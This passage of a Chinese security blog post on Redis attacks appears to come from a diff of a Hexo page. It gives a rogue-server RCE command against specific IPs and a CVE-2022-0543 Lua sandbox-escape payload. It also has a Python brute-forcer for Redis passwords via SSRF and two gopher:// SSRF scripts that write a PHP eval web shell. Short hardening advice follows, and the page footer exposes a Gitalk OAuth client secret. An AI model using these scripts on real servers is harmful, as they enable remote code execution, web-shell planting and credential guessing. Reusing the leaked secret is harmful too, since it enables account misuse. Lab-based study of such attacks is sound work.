+
+<h3 id="CNVD-2019-21763"><a href="#CNVD-2019-21763" class="headerlink" title="CNVD-2019-21763"></a>CNVD-2019-21763</h3><p>RCE自动化利用脚本-vulfocus（需要版本4.x和5.x）</p>
+<p>利用到工具：<a target="_blank" rel="noopener" href="https://github.com/vulhub/redis-rogue-getshell">https://github.com/vulhub/redis-rogue-getshell</a><br>参考文章：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/redis/4-unacc/">https://vulhub.org/#/environments/redis/4-unacc/</a></p>
+<p>上传到175.178.151.29服务器中，然后执行：</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">python</span> redis-master.py -r <span class="hljs-number">123.58.236.76</span> -p <span class="hljs-number">56879</span> -L <span class="hljs-number">47.100.167.248</span> -P <span class="hljs-number">1111</span> -f RedisModulesSDK/exp.so -c <span class="hljs-string">&quot;id&quot;</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="沙箱绕过RCE"><a href="#沙箱绕过RCE" class="headerlink" title="沙箱绕过RCE"></a>沙箱绕过RCE</h3><p>CVE-2022-0543-vulfocus</p>
+<p>参考：<a target="_blank" rel="noopener" href="https://vulhub.org/#/environments/redis/CVE-2022-0543/">https://vulhub.org/#/environments/redis/CVE-2022-0543/</a></p>
+<p>Poc：执行id命令<br>连接到redis，执行；</p>
+<figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs maxima">redis-cli -h <span class="hljs-number">123.58</span><span class="hljs-number">.236</span><span class="hljs-number">.76</span> -p <span class="hljs-number">8736</span><br><span class="hljs-built_in">eval</span> &#x27;<span class="hljs-built_in">local</span> io_l = package.loadlib(<span class="hljs-string">&quot;/usr/lib/x86_64-linux-gnu/liblua5.1.so.0&quot;</span>, <span class="hljs-string">&quot;luaopen_io&quot;</span>); <span class="hljs-built_in">local</span> io = io_l(); <span class="hljs-built_in">local</span> f = io.popen(<span class="hljs-string">&quot;id&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>); <span class="hljs-built_in">local</span> res = f:<span class="hljs-built_in">read</span>(<span class="hljs-string">&quot;*a&quot;</span>); f:<span class="hljs-built_in">close</span>(); <span class="hljs-built_in">return</span> res&#x27; <span class="hljs-number">0</span><br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h3><p>如果redis需要为有认证的，需要密码，我们也可以利用脚本爆破弱口令的密码（在后面）</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> urllib.request<br><span class="hljs-keyword">import</span> urllib.parse <br><br>url = <span class="hljs-string">&quot;http://xx.xx.xx.xx:8000/ssrf.php?url=&quot;</span><br><br>param = <span class="hljs-string">&#x27;dict://127.0.0.1:6788/auth:&#x27;</span><br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">r&#x27;d:\test\top100.txt&#x27;</span>, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f: <span class="hljs-comment">#字典</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">100</span>):<br>        passwd = f.readline()<br>        all_url = url + param + passwd<br>        <span class="hljs-comment"># print(all_url)</span><br>        request = urllib.request.Request(all_url)<br>        response = urllib.request.urlopen(request).read()<br>        <span class="hljs-comment"># print(response)</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;+OK\r\n+OK\r\n&quot;</span>.encode() <span class="hljs-keyword">in</span> response:  <span class="hljs-comment">#因为是不知道是否正确，可以用not in</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;redis passwd: &quot;</span> + passwd)<br>            <span class="hljs-keyword">break</span><br></code></pre></td></tr></table></figure>
+
+<p>如果不需要密码，直接用下面的脚本；如果有密码，用上面的脚本爆，再用下面的脚本构成payload。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">import urllib.parse<br>protocol=<span class="hljs-string">&quot;gopher://&quot;</span><br>ip=<span class="hljs-string">&quot;127.0.0.1&quot;</span><br>port=<span class="hljs-string">&quot;6379&quot;</span><br><span class="hljs-built_in">shell</span>=<span class="hljs-string">&quot;\n\n&lt;?php eval($_GET[\&quot;cmd\&quot;]);?&gt;\n\n&quot;</span><br>filename=<span class="hljs-string">&quot;1.php&quot;</span><br>path=<span class="hljs-string">&quot;/var/www/html&quot;</span><br>passwd=<span class="hljs-string">&quot;&quot;</span>        <span class="hljs-comment">#如果无密码就不加，如果有密码就加 </span><br>cmd=[<span class="hljs-string">&quot;flushall&quot;</span>,<br>     <span class="hljs-string">&quot;set 1 &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">shell</span>.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>)),<br>     <span class="hljs-string">&quot;config set dir &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(path),<br>     <span class="hljs-string">&quot;config set dbfilename &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(filename),<br>     <span class="hljs-string">&quot;save&quot;</span><br>     ]<br><span class="hljs-keyword">if</span> passwd:<br>    cmd.insert(<span class="hljs-number">0</span>,<span class="hljs-string">&quot;AUTH &#123;&#125;&quot;</span>.<span class="hljs-built_in">format</span>(passwd))<br>payload=protocol+ip+<span class="hljs-string">&quot;:&quot;</span>+port+<span class="hljs-string">&quot;/_&quot;</span><br>def redis_format(arr):<br>    <span class="hljs-literal">CRLF</span>=<span class="hljs-string">&quot;\r\n&quot;</span><br>    redis_arr = arr.<span class="hljs-built_in">split</span>(<span class="hljs-string">&quot; &quot;</span>)<br>    cmd=<span class="hljs-string">&quot;&quot;</span><br>    cmd+=<span class="hljs-string">&quot;*&quot;</span>+str(<span class="hljs-built_in">len</span>(redis_arr))<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> redis_arr:<br>        cmd+=<span class="hljs-literal">CRLF</span>+<span class="hljs-string">&quot;$&quot;</span>+str(<span class="hljs-built_in">len</span>((x.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>))))+<span class="hljs-literal">CRLF</span>+x.<span class="hljs-built_in">replace</span>(<span class="hljs-string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="hljs-string">&quot; &quot;</span>)<br>    cmd+=<span class="hljs-literal">CRLF</span><br>    <span class="hljs-literal">return</span> cmd<br><br><span class="hljs-keyword">if</span> __name__==<span class="hljs-string">&quot;__main__&quot;</span>:<br>    <span class="hljs-keyword">for</span> x <span class="hljs-keyword">in</span> cmd:<br>        payload += urllib.parse.<span class="hljs-literal">quote</span>(redis_format(x))<br>    print(urllib.parse.<span class="hljs-literal">quote</span>(payload))<br></code></pre></td></tr></table></figure>
+
+<p>再提供一个脚本</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-comment"># -*- coding: UTF-8 -*-</span><br>from urllib.parse import quote<br>from urllib.request import Request, urlopen<br><br>url = <span class="hljs-string">&quot;http://xxxxxx/?url=&quot;</span><br>gopher = <span class="hljs-string">&quot;gopher://127.0.0.1:6379/_&quot;</span><br><br>def get_password():<br>    f = open(<span class="hljs-string">&quot;message.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>)         <span class="hljs-comment">#密码文件</span><br>    return f.readlines()<br><br>def encoder_url(cmd):<br>    urlencoder = quote(cmd).replace(<span class="hljs-string">&quot;%0A&quot;</span>, <span class="hljs-string">&quot;%0D%0A&quot;</span>)<br>    return urlencoder<br><br><span class="hljs-comment">###------暴破密码，无密码可删除-------###</span><br><span class="hljs-keyword">for</span> password <span class="hljs-keyword">in</span> get_password():<br>    <span class="hljs-comment"># 攻击脚本</span><br>    path = <span class="hljs-string">&quot;/var/www/html&quot;</span><br>    shell = <span class="hljs-string">&quot;\\n\\n\\n&lt;?php eval($_POST[&#x27;cmd&#x27;]);?&gt;\\n\\n\\n&quot;</span><br>    filename = <span class="hljs-string">&quot;shell.php&quot;</span><br><br>    cmd = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    auth %s</span><br><span class="hljs-string">    quit</span><br><span class="hljs-string">    &quot;&quot;&quot;</span> % password<br>    <span class="hljs-comment"># 二次编码</span><br>    encoder = encoder_url(encoder_url(cmd))<br>    <span class="hljs-comment"># 生成payload</span><br>    payload = url + gopher + encoder<br>    <span class="hljs-comment"># 发起请求</span><br>    print(payload)<br>    request = Request(payload)<br>    response = urlopen(request).read().decode()<br>    print(<span class="hljs-string">&quot;This time password is:&quot;</span> + password)<br>    print(<span class="hljs-string">&quot;Get response is:&quot;</span>)<br>    print(response)<br>    <span class="hljs-keyword">if</span> response.count(<span class="hljs-string">&quot;+OK&quot;</span>) &gt; <span class="hljs-number">1</span>:<br>        print(<span class="hljs-string">&quot;find password : &quot;</span> + password)<br>        <span class="hljs-comment">#####---------------如无密码，直接从此开始执行---------------#####</span><br>        cmd = <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">        auth %s</span><br><span class="hljs-string">        config set dir %s</span><br><span class="hljs-string">        config set dbfilename %s</span><br><span class="hljs-string">        set test1 &quot;%s&quot;</span><br><span class="hljs-string">        save</span><br><span class="hljs-string">        quit</span><br><span class="hljs-string">        &quot;&quot;&quot;</span> % (password, path, filename, shell)<br>        <span class="hljs-comment"># 二次编码</span><br>        encoder = encoder_url(encoder_url(cmd))<br>        <span class="hljs-comment"># 生成payload</span><br>        payload = url + gopher + encoder<br>        <span class="hljs-comment"># 发起请求</span><br>        request = Request(payload)<br>        print(payload)<br>        response = urlopen(request).read().decode()<br>        print(<span class="hljs-string">&quot;response is:&quot;</span> + response)<br>        <span class="hljs-keyword">if</span> response.count(<span class="hljs-string">&quot;+OK&quot;</span>) &gt; <span class="hljs-number">5</span>:<br>            print(<span class="hljs-string">&quot;Write success！&quot;</span>)<br>            <span class="hljs-keyword">exit</span>()<br>        <span class="hljs-keyword">else</span>:<br>            print(<span class="hljs-string">&quot;Write failed. Please check and try again&quot;</span>)<br>            <span class="hljs-keyword">exit</span>()<br>        <span class="hljs-comment">#####---------------如无密码，到此处结束------------------#####</span><br>print(<span class="hljs-string">&quot;Password not found!&quot;</span>)<br>print(<span class="hljs-string">&quot;Please change the dictionary,and try again.&quot;</span>)<br></code></pre></td></tr></table></figure>
+
+<h3 id="正确做法"><a href="#正确做法" class="headerlink" title="正确做法"></a>正确做法</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">设置密码<br>requirepass your_strong_password<br>限制只在本地登录，监听本地端口<br><span class="hljs-built_in">bind</span> 127.0.0.1<br>开启安全模式<br>protected-mode <span class="hljs-built_in">yes</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/news/12517">Redis漏洞及其利用方式-先知社区</a></p>
+
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/Redis/" class="category-chain-item">Redis</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/Redis/" class="print-no-link">#Redis</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>Redis</div>
+      <div>https://rpniu.github.io/2025/04/17/Redis/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>rPniu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年4月17日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-cc-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/04/17/waf/" title="雷池waf">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">雷池waf</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2025/04/12/shiro550/" title="shiro550">
+                        <span class="hidden-mobile">shiro550</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+  
+  
+    <article id="comments" lazyload>
+      
+  <div id="gitalk-container"></div>
+  <script type="text/javascript">
+    Fluid.utils.loadComments('#gitalk-container', function() {
+      Fluid.utils.createCssLink('/css/gitalk.css')
+      Fluid.utils.createScript('https://lib.baomitu.com/gitalk/1.8.0/gitalk.min.js', function() {
+        var options = Object.assign(
+          {"clientID":"Ov23lirn09NkIEi34FA2","clientSecret":"01e7d495ef8743e2725eb1a6bf7478f9abae5edf","repo":"gitalk-comments","owner":"rPniu","admin":"rPniu","language":"zh-CN","labels":["Gitalk"],"perPage":10,"pagerDirection":"last","distractionFreeMode":false,"createIssueManually":true,"proxy":"https://cors-anywhere.azm.workers.dev/https://github.com/login/oauth/access_token"},
+          {
+            id: 'a34c0d7dff907aa2510353a51d5008e2'
+          }
+        )
+        var gitalk = new Gitalk(options);
+        gitalk.render('gitalk-container');
+      });
+    });
+  </script>
+  <noscript>Please enable JavaScript to view the comments</noscript>
+
+
+    </article>
+  
+
+
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
+    <div class="footer-inner">
+  
+    <div class="footer-content">
+       <a href="https://hexo.io" target="_blank" rel="nofollow noopener"><span>Hexo</span></a> <i class="iconfont icon-love"></i> <a href="https://github.com/fluid-dev/hexo-theme-fluid" target="_blank" rel="nofollow noopener"><span>Fluid</span></a> 
+    </div>
+  
+  
+  
+</div>
+
+  </footer>
+
+  <!-- Scripts -->
+  
+  <script  src="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.js" ></script>
+  <link  rel="stylesheet" href="https://lib.baomitu.com/nprogress/0.2.0/nprogress.min.css" />
+
+  <script>
+    NProgress.configure({"showSpinner":false,"trickleSpeed":100})
+    NProgress.start()
+    window.addEventListener('load', function() {
+      NProgress.done();
+    })
+  </script>
+
+
+<script  src="https://lib.baomitu.com/jquery/3.6.4/jquery.min.js" ></script>
+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.20.1/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
